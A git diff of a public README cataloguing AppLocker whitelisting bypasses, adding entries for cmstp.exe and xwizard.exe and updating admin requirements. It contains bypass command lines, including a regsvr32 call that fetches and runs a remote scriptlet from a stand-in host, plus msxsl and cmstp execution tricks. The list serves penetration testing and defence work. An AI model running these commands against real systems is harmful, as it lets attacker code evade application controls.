@@ -1,16 +1,24 @@
 # Ultimate AppLocker ByPass List
 The goal of this repository is to document the most common techniques to bypass AppLocker. 
 This README file contains a complete list of all known bypasses.
-Since AppLocker can be configured in different ways it makes sense to have "master" list of bypasses. 
+Since AppLocker can be configured in different ways it makes sense to have master list of bypasses. 
+This README.MD will be the master and will be updated with known and possible AppLocker bypasses.
 
 **There are verified lists for EXE and DLL bypasses.**
-These bypasses are based on the default rules created with AppLocker
+These bypasses are based on the default rules created with AppLocker. 
+
 -	[BypassDLL-DefaultRules.MD](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/BypassDLL-DefaultRules.md)
 -	[BypassEXE-DefaultRules.MD](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/BypassEXE-DefaultRules.md)
 
+
+If you are wondering how to create the default rules you can follow this guide:
+https://www.rootusers.com/implement-applocker-rules/
+
+
 Please contribute and do point out errors or resources I have forgotten.
 Remember that bypass techniques for BypassDLL and BypassEXE must be verified.
-These list should only contain valid bypasses. 
+The BypassDLL-DefaultRules and BypassEXE-DefaultRules list should only contain valid bypasses. 
+
 
 
 ## 1. Rundll32.exe
@@ -30,7 +38,8 @@ https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7
 
 regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
 
-Requires admin: ?
+Requires admin: No
+Bypasses: 
 
 Links:  
 https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
@@ -252,7 +261,7 @@ https://www.contextis.com/resources/blog/applocker-bypass-registry-key-manipulat
 
 msxsl.exe customers.xml script.xsl
 
-Requires admin: ?
+Requires admin: No
 
 Links:  
 https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/
@@ -269,3 +278,25 @@ Requires admin: ?
 
 Links:  
 https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/
+
+
+## 23. cmstp.exe
+
+cmstp.exe /ni /s c:\cmstp\CorpVPN.inf
+
+Requires admin: No
+
+Links:  
+https://msitpros.com/?p=3960
+https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e
+
+
+## 24. xwizard.exe
+
+xwizard.exe argument1 argument2
+DLL loading in same folder xwizard.dll
+
+Requires admin: No
+
+Links:
+http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/
